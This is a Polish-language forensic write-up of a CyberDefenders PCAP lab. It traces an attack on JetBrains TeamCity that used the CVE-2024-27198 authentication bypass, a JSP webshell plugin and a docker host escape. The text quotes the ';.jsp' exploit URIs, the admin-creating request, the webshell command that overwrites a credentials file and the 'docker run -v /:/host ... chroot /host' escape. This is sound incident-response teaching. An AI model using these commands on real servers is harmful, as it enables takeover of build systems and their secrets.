# Analiza incydentu - exploit TeamCity (CVE-2024-27198) -> webshell -> docker escape

> **Platforma:** Wireshark + CyberChef (2x URL Decode body komend webshella)
> **Źródło:** CyberDefenders - lab JetBrains (analiza PCAP)
> **Typ zdarzenia:** Initial Access (Exploit Public-Facing App) -> Persistence (Webshell) -> Execution -> Impact (Data Manipulation) -> Privilege Escalation (Escape to Host)
> **Severity:** Critical
> **MITRE ATT&CK:** T1190, T1136, T1505.003, T1059.004, T1565.001, T1611

---

## Podsumowanie

Atakujący z IP `23.158.56.196` zaatakował serwer **JetBrains TeamCity 2023.11.3** (`3.71.79.4:8111`), wystawiony do internetu. Wykorzystał **CVE-2024-27198** (authentication bypass) - żądaniem `POST /hax?jsp=/app/rest/users;.jsp` ominął logowanie i przez REST API **utworzył własne konto z rolą `SYSTEM_ADMIN`** (`c91oyemw:CL5vzdwLuK`).

Nowym kontem zalogował się (Basic Auth), wgrał **złośliwy plugin `NSt8bHTg.zip`** zawierający **webshell JSP** (`/plugins/NSt8bHTg/NSt8bHTg.jsp`) i zaczął wykonywać przez niego komendy. Nadpisał plik `/tmp/Creds.txt` z danymi admina fałszywymi poświadczeniami, a na koniec przez `docker run` z zamontowanym `/` hosta i `chroot` **wyszedł z kontenera na hosta** - pełna kontrola nad systemem.

---

## Kontekst

### CVE-2024-27198 - na czym polega

Luka w TeamCity **do wersji 2023.11.3 włącznie** (poprawka w 2023.11.4), CVSS 9.8. To **authentication bypass przez alternatywną ścieżkę**: jeśli żądanie kończy się na `;.jsp`, serwer traktuje je jak publiczny zasób JSP i nie sprawdza uwierzytelnienia - a jednocześnie przekazuje je do chronionego endpointu (`jsp=/app/rest/...`).

Efekt: nieuwierzytelniony atakujący ma dostęp do całego REST API, czyli może np. **stworzyć konto admina** albo wygenerować token. Od tego momentu ma pełne uprawnienia w TeamCity, a z nimi RCE (wgranie pluginu = wykonanie kodu na serwerze).

---

## IOC (Indicators of Compromise)

| Typ | Wartość |
|---|---|
| IP atakującego | `23.158.56.196` |
| Zaatakowany serwer | `3.71.79.4:8111` (wew. `172.31.25.119`, kontener `172.17.0.2`) |
| Podatna usługa | JetBrains TeamCity `2023.11.3` (build 147512) |
| CVE | `CVE-2024-27198` |
| Exploit URI | `POST /hax?jsp=/app/rest/users;.jsp`, `POST /hax?jsp=/app/rest/users/id:2/tokens/mD5r0yemB0;.jsp` |
| Konto utworzone przez atakującego | `c91oyemw` / `CL5vzdwLuK` (rola `SYSTEM_ADMIN`, email `c91oyemw@example.com`) |
| Złośliwy plugin | `NSt8bHTg.zip` (upload przez `/admin/pluginUpload.html`) |
| Webshell | `/plugins/NSt8bHTg/NSt8bHTg.jsp` (komendy w parametrze `cmd=`) |
| Zmodyfikowany plik | `/tmp/Creds.txt` -> `username:a1l4m,password:youarecompromised` |
| Komenda escape | `docker run --rm -it -v /:/host ubuntu chroot /host` |
| User-Agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/122.0.0.0` |

---

## 5W

| Pytanie | Odpowiedź |
|---|---|
| **Who** (kto) | Atakujący z IP `23.158.56.196`, działający potem na koncie `c91oyemw` |
| **What** (co) | Exploit CVE-2024-27198 -> konto admina -> plugin z webshellem -> manipulacja `Creds.txt` -> ucieczka z kontenera na hosta |
| **When** (kiedy) | 2024-06-30, ok. 08:02:49 (exploit) - 08:19:49 (ostatnie komendy docker) |
| **Where** (gdzie) | Serwer TeamCity `3.71.79.4:8111` (`172.31.25.119`), kontener `172.17.0.2`, plik `/tmp/Creds.txt` |
| **Why** (po co) | Pełna kontrola nad serwerem CI/CD (dostęp do kodu, sekretów, pipeline'ów), utrzymanie dostępu (webshell), zatarcie/podmiana danych logowania admina |

---

## Przebieg analizy (filtry faktycznie użyte)

### Krok 0 - kto generuje najwięcej ruchu (Statistics -> Conversations)

**Statistics -> Conversations -> IPv4**, sortowanie po Packets.

**Ujawniło:** najwięcej ruchu ma `197.32.146.131` (8918 pakietów, ok. 6 MB). Sprawdziłem go filtrem:
```
ip.addr == 197.32.146.131 && http.request.method == POST
```
Same akcje w panelu (`/admin/action.html`, `/ajax.html`, `/admin/createObjectFromUrl.html`, `/generateId.html`), bez śladów exploita - wygląda na zwykłą pracę z serwerem, a nie atak.

<img width="1920" height="799" alt="Zrzut ekranu (1258)" src="https://github.com/user-attachments/assets/fa459a19-0d63-4827-aa38-9e4695a65b6c" />

<img width="1920" height="808" alt="Zrzut ekranu (1259)" src="https://github.com/user-attachments/assets/99f5f44b-2369-4646-8d04-20c0b3e704d0" />

---

### Krok 1 - IP atakującego

```
http.request.method==POST
```
**Ujawniło:** z adresu `23.158.56.196` idzie cały łańcuch ataku:
- kilka `POST /loginSubmit.html` - próby zwykłego logowania,
- `POST /hax?jsp=/app/rest/users;.jsp` i `POST /hax?jsp=/app/rest/users/id:2/tokens/mD5r0yemB0;.jsp` - exploit,
- `/authenticationTest.html`, `/admin/pluginUpload.html` `(application/zip)`, `/admin/plugins.html`,
- seria `POST /plugins/NSt8bHTg/NSt8bHTg.jsp` - webshell.

> Ustalono: IP atakującego to `23.158.56.196`.

<img width="1920" height="801" alt="Zrzut ekranu (1261)" src="https://github.com/user-attachments/assets/070ac404-ce96-45f6-aa50-70fc6250ea78" />

---

### Krok 2 - wersja serwera + exploit (Follow HTTP Stream)

Z listy POST-ów wziąłem żądanie na `/hax?jsp=...` i zrobiłem Follow -> HTTP Stream:
```
tcp.stream eq 364
```
**Ujawniło:**
- odpowiedź serwera z XML `<server version="2023.11.3 (build 147512)" ...>` - **wersja TeamCity 2023.11.3**,
- zaraz po niej `POST /hax?jsp=/app/rest/users;.jsp` z JSON-em tworzącym użytkownika:
  `{"username": "c91oyemw", "password": "CL5vzdwLuK", ... "roleId": "SYSTEM_ADMIN" ...}` i odpowiedź `HTTP/1.1 200` - **konto utworzone**,
- kolejny `POST /hax?jsp=/app/rest/users/id:2/tokens/mD5r0yemB0;.jsp` - wygenerowanie **tokena API** dla nowego konta (id:2). Tym tokenem atakujący podpisuje potem żądania (`Authorization: Bearer ...`).

> Ustalono: wersja `2023.11.3`. Ścieżka z `;.jsp` na końcu + wersja przed 2023.11.4 = **CVE-2024-27198** (auth bypass).

<img width="1920" height="799" alt="Zrzut ekranu (1263)" src="https://github.com/user-attachments/assets/5d2bb0c1-b93d-4b08-bde0-b07bd3017ae1" />

<img width="1920" height="804" alt="Zrzut ekranu (1266)" src="https://github.com/user-attachments/assets/f7091671-5bba-49d8-92b9-2fd361157adc" />


---

### Krok 3 - poświadczenia (potwierdzenie filtrem)

```
http.request.method==POST && ip.addr==23.158.56.196 && frame contains "password"
```
**Ujawniło:** 4 ramki (każda podwójnie przez Dockera):
- 08:02:49 - `POST /hax?jsp=/app/rest/users;.jsp` (JSON) - tworzenie konta `c91oyemw:CL5vzdwLuK`,
- 08:13:56 - `POST /plugins/NSt8bHTg/NSt8bHTg.jsp` - komenda webshella ze słowem "password" (krok 6).

Zaraz po utworzeniu konta pojawia się `POST /authenticationTest.html?csrf` - logowanie nowym kontem przez Basic Auth.

> Ustalono: poświadczenia użyte do Basic Auth: `c91oyemw:CL5vzdwLuK`.

<img width="1920" height="804" alt="Zrzut ekranu (1272)" src="https://github.com/user-attachments/assets/0e8ed1f1-8283-4d39-84c3-9dd527fb1ec4" />


---

### Krok 4 - upload webshella i pierwsza komenda

```
http.request.method==POST && ip.addr==23.158.56.196
```
**Ujawniło:** kolejność działań atakującego zaraz po zalogowaniu:
1. `POST /authenticationTest.html?csrf` - logowanie,
2. `POST /admin/pluginUpload.html` **(application/zip)** - upload pluginu `NSt8bHTg.zip`,
3. `POST /admin/plugins.html` - włączenie pluginu,
4. `POST /plugins/NSt8bHTg/NSt8bHTg.jsp` (form-urlencoded) - **seria wywołań webshella**, ten sam plik raz za razem z różną długością = różne komendy.

Pierwsze wywołanie `.jsp` (ramka 25572) to pierwsza komenda przez webshell - **2024-06-30 08:03**. W nagłówkach widać już token `Authorization: Bearer ...` i `X-TC-CSRF-Token`, czyli atakujący działa w pełni uwierzytelniony.

> Ustalono: webshell wgrany jako plugin `NSt8bHTg.zip`, pierwsza komenda o 08:03.

<img width="1920" height="802" alt="Zrzut ekranu (1268)" src="https://github.com/user-attachments/assets/ed7116a1-5e79-41e6-baea-4a2729229a40" />


---

### Krok 5 - manipulacja plikiem Creds.txt

Z wyniku filtra `frame contains "password"` wziąłem ramkę 31123 (08:13:56) i Follow HTTP Stream:
```
tcp.stream eq 547
```
**Ujawniło:** body żądania do webshella jest URL-encoded:
```
cmd=bash+-c+%27echo+%22username%3Aa1l4m%2Cpassword%3Ayouarecompromised%22+%3E+%2Ftmp%2FCreds.txt%27
```
Po **URL Decode w CyberChef** (z opcją "Treat + as space"):
```
cmd=bash -c 'echo "username:a1l4m,password:youarecompromised" > /tmp/Creds.txt'
```
Operator `>` **nadpisuje** cały plik - oryginalne dane admina zostały zastąpione fałszywymi.

> Ustalono: nowe dane w pliku to `a1l4m:youarecompromised`. Technika: **T1565.001 Stored Data Manipulation**.

<img width="1920" height="799" alt="Zrzut ekranu (1273)" src="https://github.com/user-attachments/assets/c7e5f595-42b1-42e6-a3ef-cfc252b79da0" />

<img width="1920" height="868" alt="Zrzut ekranu (1275)" src="https://github.com/user-attachments/assets/b3f7a63f-59cc-4c0a-b03c-6e6e862f554d" />

<img width="1920" height="858" alt="Zrzut ekranu (1278)" src="https://github.com/user-attachments/assets/2db9fc6d-159c-4202-a44e-b1a4694d4411" />

---

### Krok 6 - ucieczka z kontenera (docker)

```
http.request.method==POST && ip.addr==23.158.56.196 && frame contains "docker"
```
**Ujawniło:** 3 wywołania webshella z komendą `docker` (08:19:14, 08:19:40, 08:19:49). W hexdumpie ramki 32002 widać pierwszą próbę: `docker run --rm -it --privileged ubuntu`.

Follow HTTP Stream dla tej rozmowy:
```
tcp.stream eq 601
```
**Ujawniło:** w ramce 32111 (08:19:40):
```
cmd=docker+run+--rm+-it+-v+%2F%3A%2Fhost+ubuntu+chroot+%2Fhost
```
Body znowu jest URL-encoded (`%2F` = `/`, `%3A` = `:`, `+` = spacja), więc drugi raz wrzuciłem je do **CyberChef -> URL Decode** (z "Treat + as space"):
```
cmd=docker run --rm -it -v /:/host ubuntu chroot /host
```
Po odcięciu prefiksu `cmd=`:
```
docker run --rm -it -v /:/host ubuntu chroot /host
```
- `-v /:/host` - montuje **cały system plików hosta** do kontenera pod `/host`,
- `chroot /host` - przełącza root na system hosta = atakujący działa **na hoście, nie w kontenerze**.

> Ustalono: komenda escape to `docker run --rm -it -v /:/host ubuntu chroot /host` (T1611 Escape to Host).

<img width="1920" height="801" alt="Zrzut ekranu (1279)" src="https://github.com/user-attachments/assets/a8b85ef0-0db4-4c76-a285-666cb371ae5a" />

<img width="1920" height="802" alt="Zrzut ekranu (1280)" src="https://github.com/user-attachments/assets/51174dc0-7fad-4b4b-91b8-e99a29cba31b" />


---

## MITRE ATT&CK

| Technika | ID | Gdzie w incydencie |
|---|---|---|
| Exploit Public-Facing Application | T1190 | CVE-2024-27198 (`/hax?jsp=...;.jsp`) |
| Create Account | T1136 | konto `c91oyemw` z rolą `SYSTEM_ADMIN` przez REST API |
| Server Software Component: Web Shell | T1505.003 | plugin `NSt8bHTg.zip` -> `NSt8bHTg.jsp` |
| Command and Scripting Interpreter: Unix Shell | T1059.004 | `bash -c ...` przez parametr `cmd=` |
| Data Manipulation: Stored Data Manipulation | T1565.001 | nadpisanie `/tmp/Creds.txt` |
| Escape to Host | T1611 | `docker run -v /:/host ... chroot /host` |

<img width="1045" height="226" alt="Zrzut ekranu (1262)" src="https://github.com/user-attachments/assets/baa00d90-4c22-4ae1-ad44-52767e59b6fc" />
<img width="1066" height="217" alt="Zrzut ekranu (1264)" src="https://github.com/user-attachments/assets/b6b7a3d0-0baf-4c73-a3de-e198f90c8f87" />
<img width="1070" height="226" alt="Zrzut ekranu (1265)" src="https://github.com/user-attachments/assets/2a8ce3bd-d922-47c4-b1fb-d442016f4a83" />
<img width="1060" height="308" alt="Zrzut ekranu (1267)" src="https://github.com/user-attachments/assets/5c2a0ce9-bbbf-48db-a318-21fe43e6fbb5" />
<img width="1077" height="244" alt="Zrzut ekranu (1269)" src="https://github.com/user-attachments/assets/b1ed5476-9dc8-4dc6-94dc-1f59ae79c83d" />
<img width="1072" height="212" alt="Zrzut ekranu (1271)" src="https://github.com/user-attachments/assets/64735dd9-6e39-43ec-bcac-7ea45459a873" />
<img width="1073" height="309" alt="Zrzut ekranu (1276)" src="https://github.com/user-attachments/assets/fd442b71-2129-402c-95ca-5448525fdaf2" />
<img width="1061" height="267" alt="Zrzut ekranu (1277)" src="https://github.com/user-attachments/assets/eb2d4636-6395-47d7-bf59-304ee6625773" />
<img width="1012" height="257" alt="Zrzut ekranu (1281)" src="https://github.com/user-attachments/assets/17bb83c7-8b89-48e4-84fe-571b7d420c85" />


